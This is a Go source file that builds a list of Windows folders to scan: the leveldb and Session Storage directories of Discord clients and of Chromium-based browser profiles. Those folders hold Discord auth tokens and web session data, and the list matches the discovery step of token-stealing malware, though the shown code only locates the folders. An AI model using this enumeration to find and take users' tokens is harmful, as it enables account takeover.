package paths

import (
	"os"
	"path/filepath"
	"strings"
)

type Target struct {
	Label string
	Path  string
}

func envPath(key string) string {
	return os.Getenv(key)
}

func levelDBUnder(root string) []string {
	var dirs []string
	if root == "" {
		return dirs
	}
	info, err := os.Stat(root)
	if err != nil || !info.IsDir() {
		return dirs
	}
	for _, sub := range []string{
		filepath.Join(root, "Local Storage", "leveldb"),
		filepath.Join(root, "Session Storage"),
	} {
		if st, err := os.Stat(sub); err == nil && st.IsDir() {
			dirs = append(dirs, sub)
		}
	}
	_ = filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		if d.IsDir() && strings.EqualFold(d.Name(), "leveldb") {
			dirs = append(dirs, path)
		}
		return nil
	})
	return uniqueStrings(dirs)
}

func discordRoots() []Target {
	appdata := envPath("APPDATA")
	local := envPath("LOCALAPPDATA")
	candidates := []struct {
		label string
		path  string
	}{
		{"Discord Desktop", filepath.Join(appdata, "discord")},
		{"Discord Desktop", filepath.Join(appdata, "Discord")},
		{"Discord Canary", filepath.Join(appdata, "discordcanary")},
		{"Discord PTB", filepath.Join(appdata, "discordptb")},
		{"Discord Desktop (Local)", filepath.Join(local, "Discord")},
		{"Discord Canary (Local)", filepath.Join(local, "discordcanary")},
		{"Discord PTB (Local)", filepath.Join(local, "discordptb")},
	}
	seen := map[string]bool{}
	var roots []Target
	for _, c := range candidates {
		if seen[c.path] {
			continue
		}
		if st, err := os.Stat(c.path); err != nil || !st.IsDir() {
			continue
		}
		seen[c.path] = true
		roots = append(roots, Target{Label: c.label, Path: c.path})
	}
	return roots
}

func browserProfiles() []Target {
	local := envPath("LOCALAPPDATA")
	browsers := []struct {
		name string
		root string
	}{
		{"Chrome", filepath.Join(local, "Google", "Chrome", "User Data")},
		{"Edge", filepath.Join(local, "Microsoft", "Edge", "User Data")},
		{"Brave", filepath.Join(local, "BraveSoftware", "Brave-Browser", "User Data")},
		{"Opera", filepath.Join(local, "Opera Software", "Opera Stable")},
		{"Opera GX", filepath.Join(local, "Opera Software", "Opera GX Stable")},
		{"Vivaldi", filepath.Join(local, "Vivaldi", "User Data")},
	}
	var out []Target
	for _, b := range browsers {
		entries, err := os.ReadDir(b.root)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			name := e.Name()
			if name != "Default" && !strings.HasPrefix(name, "Profile ") {
				continue
			}
			profile := filepath.Join(b.root, name)
			for _, sub := range []string{
				filepath.Join(profile, "Local Storage", "leveldb"),
				filepath.Join(profile, "Session Storage"),
			} {
				if st, err := os.Stat(sub); err == nil && st.IsDir() {
					out = append(out, Target{
						Label: b.name + " (" + name + ")",
						Path:  sub,
					})
				}
			}
		}
	}
	return out
}

func uniqueStrings(in []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, s := range in {
		if seen[s] {
			continue
		}
		seen[s] = true
		out = append(out, s)
	}
	return out
}

func AllScanTargets() []Target {
	seen := map[string]bool{}
	var targets []Target

	add := func(label, path string) {
		if seen[path] {
			return
		}
		seen[path] = true
		targets = append(targets, Target{Label: label, Path: path})
	}

	for _, root := range discordRoots() {
		for _, ldb := range levelDBUnder(root.Path) {
			add(root.Label, ldb)
		}
	}
	for _, t := range browserProfiles() {
		add(t.Label, t.Path)
	}
	return targets
}
